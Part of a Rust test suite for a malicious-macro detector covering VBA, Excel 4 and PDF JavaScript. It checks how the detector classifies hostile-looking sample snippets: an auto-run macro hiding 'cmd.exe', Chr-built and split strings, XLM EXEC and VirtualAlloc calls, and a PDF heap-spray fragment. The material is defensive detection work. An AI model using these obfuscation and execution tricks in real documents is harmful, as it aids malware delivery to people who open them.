        assert_eq!(first.kind, BehaviorKind::RunsProgram);
        assert_eq!(first.procedure, "Loud");
        assert!(
            first.detail.contains("WScript.Shell") || first.detail.contains("cmd /c"),
            "{}",
            first.detail
        );
        // Behaviours are sorted by how serious they are, never the other way round.
        let order: Vec<MacroIntent> = a.behaviors.iter().map(|b| b.kind.intent()).collect();
        assert!(order.windows(2).all(|w| w[0] >= w[1]), "{order:?}");
        assert_eq!(a.procedures, vec!["Quiet".to_owned(), "Loud".to_owned()]);
    }

    #[test]
    fn text_in_comments_is_not_behaviour() {
        let src = "Sub Note()\n  \' later: Shell \"calc\" and URLDownloadToFile\n  Rem CreateObject(\"WScript.Shell\")\n  Range(\"A1\").Value = 1\nEnd Sub";
        let a = analyze(src, MacroLanguage::Vba);
        assert_eq!(a.intent, MacroIntent::Benign, "{:?}", a.behaviors);
    }

    #[test]
    fn hiding_the_text_is_never_benign() {
        // Characters assembled from numbers.
        let chars =
            "Sub A()\n s = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47)\nEnd Sub";
        let a = analyze(chars, MacroLanguage::Vba);
        assert!(a.intent >= MacroIntent::Suspicious, "{:?}", a.behaviors);
        assert!(kinds(&a).contains(&BehaviorKind::ObfuscatedCode));
        // A name cut into pieces so that no keyword is present.
        let pieces =
            "Sub A()\n n = \"Wsc\" & \"ript\" & \".Sh\" & \"ell\"\n Set o = GetObject(n)\nEnd Sub";
        let a = analyze(pieces, MacroLanguage::Vba);
        assert!(a.intent >= MacroIntent::Suspicious, "{:?}", a.behaviors);
        // An encoded blob.
        let blob = format!("Sub A()\n p = \"{}\"\nEnd Sub", "QUJD".repeat(80));
        assert!(analyze(&blob, MacroLanguage::Vba).intent >= MacroIntent::Suspicious);
        // Ordinary line breaks and quotes via Chr are fine.
        let plain = "Sub A()\n t = \"a\" & Chr(13) & Chr(10) & \"b\" & Chr(9) & Chr(34)\nEnd Sub";
        assert_eq!(analyze(plain, MacroLanguage::Vba).intent, MacroIntent::Benign);
    }

    #[test]
    fn starting_by_itself_and_hiding_the_text_is_a_loader() {
        let src = "Sub AutoOpen()\n x = StrReverse(\"ecxe.dmc\")\nEnd Sub";
        let a = analyze(src, MacroLanguage::Vba);
        assert_eq!(a.intent, MacroIntent::Malicious, "{:?}", a.behaviors);
    }

    #[test]
    fn a_module_that_was_cut_cannot_be_called_benign() {
        let src = "Sub A()\n Range(\"A1\").Value = 1\nEnd Sub";
        assert_eq!(analyze_module(src, MacroLanguage::Vba, false).intent, MacroIntent::Benign);
        let a = analyze_module(src, MacroLanguage::Vba, true);
        assert_eq!(a.intent, MacroIntent::Suspicious);
        assert!(kinds(&a).contains(&BehaviorKind::NotFullyRead));
    }

    #[test]
    fn addresses_and_programs_named_in_a_module_make_it_suspicious_at_least() {
        let a = analyze("Sub A()\n u = \"http://203.0.113.5/x\"\nEnd Sub", MacroLanguage::Vba);
        assert!(a.intent >= MacroIntent::Suspicious);
        assert!(kinds(&a).contains(&BehaviorKind::ContainsAddress));
        let a = analyze("Sub A()\n f = \"setup.exe\"\nEnd Sub", MacroLanguage::Vba);
        assert!(kinds(&a).contains(&BehaviorKind::MentionsProgram));
    }

    #[test]
    fn excel_4_macros_are_never_benign() {
        let a = analyze("=HALT()", MacroLanguage::Xlm);
        assert!(a.intent >= MacroIntent::Suspicious);
        assert!(kinds(&a).contains(&BehaviorKind::XlmMacro));
        let a = analyze("=EXEC(\"calc.exe\")", MacroLanguage::Xlm);
        assert_eq!(a.intent, MacroIntent::Malicious);
        let a = analyze(
            "=CALL(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\",0,1000000,4096,64)",
            MacroLanguage::Xlm,
        );
        assert_eq!(a.intent, MacroIntent::Malicious);
    }

    #[test]
    fn pdf_form_scripts_are_benign_and_launching_things_is_not() {
        let form = "var f = this.getField(\"total\");\nAFNumber_Format(2, 0, 0, 0, \"$\", true);\nAFSimple_Calculate(\"SUM\", new Array(\"a\", \"b\"));";
        let a = analyze(form, MacroLanguage::JavaScript);
        assert_eq!(a.intent, MacroIntent::Benign, "{:?}", a.behaviors);
        let go = analyze("app.launchURL(\"http://x.example/\", true);", MacroLanguage::JavaScript);
        assert!(go.intent >= MacroIntent::Suspicious);
        let spray = analyze(
            "var s = unescape(\"%u9090%u9090\"); util.printf(\"%45000f\", 1);",
            MacroLanguage::JavaScript,
        );
        assert_eq!(spray.intent, MacroIntent::Malicious, "{:?}", spray.behaviors);
    }

    #[test]
    fn rule_needles_are_lower_case_and_labels_unique_per_table() {
        for table in [
            VBA_SUSPICIOUS,
            XLM_SUSPICIOUS,
            BASIC_SUSPICIOUS,
            PDF_JS_SUSPICIOUS,
            VBA_BENIGN,
            PDF_JS_BENIGN,
        ] {
            for (needle, _, _) in table {
                assert_eq!(
                    *needle,
                    needle.to_ascii_lowercase(),
                    "{needle} must be written in lower case"
                );
            }
        }
        // Nothing in the benign tables points above benign, and nothing in the others points to benign.
        for (_, label, kind) in VBA_BENIGN.iter().chain(PDF_JS_BENIGN) {
            assert_eq!(kind.intent(), MacroIntent::Benign, "{label}");
        }
        for table in [VBA_SUSPICIOUS, XLM_SUSPICIOUS, BASIC_SUSPICIOUS, PDF_JS_SUSPICIOUS] {
            for (_, label, kind) in table {
                assert_ne!(kind.intent(), MacroIntent::Benign, "{label}");
            }
        }
    }

    #[test]
    fn hostile_sources_are_bounded() {
        // A very long single line and very many lines must neither hang nor flood the report.
        let long = format!("Sub A()\n x = \"{}\"\nEnd Sub", "a".repeat(2_000_000));
        let a = analyze(&long, MacroLanguage::Vba);
        assert!(a.behaviors.len() <= MAX_BEHAVIORS);
        let many = "Shell \"x\"\n".repeat(300_000);
        let a = analyze(&many, MacroLanguage::Vba);
        assert!(a.behaviors.len() <= MAX_BEHAVIORS);
        assert_eq!(a.intent, MacroIntent::Malicious);
        assert!(
            kinds(&a).contains(&BehaviorKind::NotFullyRead),
            "past the line limit the rest is unread"
        );
    }
}
